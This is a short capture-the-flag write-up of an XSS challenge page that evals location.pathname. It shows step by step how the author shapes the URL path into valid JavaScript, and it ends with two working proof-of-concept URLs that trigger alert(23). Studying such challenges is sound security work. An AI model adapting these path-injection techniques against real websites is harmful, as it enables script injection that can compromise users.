# alert(23) to win - eval(location.pathname) - writeup

while surfing the internet for some sec news, a xss challenge came across.
challenge address `https://renwax23.github.io/X/chal/oct22/`

It's on github. So there is no backend, all the codes are in the front. Let's see it.

```javascript

if(/\/chal\/oct22\//.test(location.pathname.substr(0,15))){

eval(location.pathname)

}
```
The logic is simple. After checking the location.pathname, pathname will be evaled. So this is the sink.

## round one
https://renwax23.github.io/X/chal/oct22/ 
Check the console. We see a syntax error.
`
Uncaught SyntaxError: Invalid regular expression flags
    at (index):23
`
So i think that the key is regex. After reading some docs about regex, I couldn't get an answer.

I tried some random stuff.`-` `&` `?` `\` , and get 404.

round one failed.

## round two
So I need to get code 200 and insert some code in the url.
But how? Some are urlencoded. Some will return code 404. I fuzzed the url to see what I can insert while it still returns 200. No luck.
https://renwax23.github.io/X/chal/oct22//
I add a `/` in the url. And it returned 200. So I can insert `/` as I need.
https://renwax23.github.io//X/chal/oct22/
I add a `/` in the front. Checking the console, there's no syntax error. I thought that it's the right way. So I need to get some line break. Because `//` comment the code. Trying '%0d%0a' and `\u2028` (from prompt(1) to win), they are urlencoded.

I also tried `a/../`. But chrome will short it. 
Trying some urlencode. And `https://renwax23.github.io//X/chal/oct22/a/..%2f` returns code 200.
Eureka!
Now I can inject code into pathname and I still get code 200.

## round three
But there's still no alert.
https://renwax23.github.io/X//chal/oct22/a/..%2f
So I moved `/`. New error.
```
Uncaught SyntaxError: Unexpected token '.'
```
Not regex syntax error.

So now I need to get the syntax right. After some trying, I get a new error message.
https://renwax23.github.io/X//chal/oct22/a;//..%2f
```
Uncaught ReferenceError: chal is not defined
```
So we need to need to define `chal`. And in javascript, you can use before define. So we can use `var` to define. I tried `var chal`. Space will be %20. Syntax error.
We can use comment `/**/` to seperate.

In the end, we get the alert.
poc:
https://renwax23.github.io/X//chal/oct22/-alert(23);var/*/..%2f/..%2f/*/chal=1;var/*/..%2f/..%2f/..%2f/*/oct22=2//..%2f/..%2f

Sereval hours later. I tried again. And get a less one.
https://renwax23.github.io/X//chal/oct22/alert(23);var/*/..%2f../*/chal,oct22//..%2f..

Really interesting challenge. Thanks to the author.
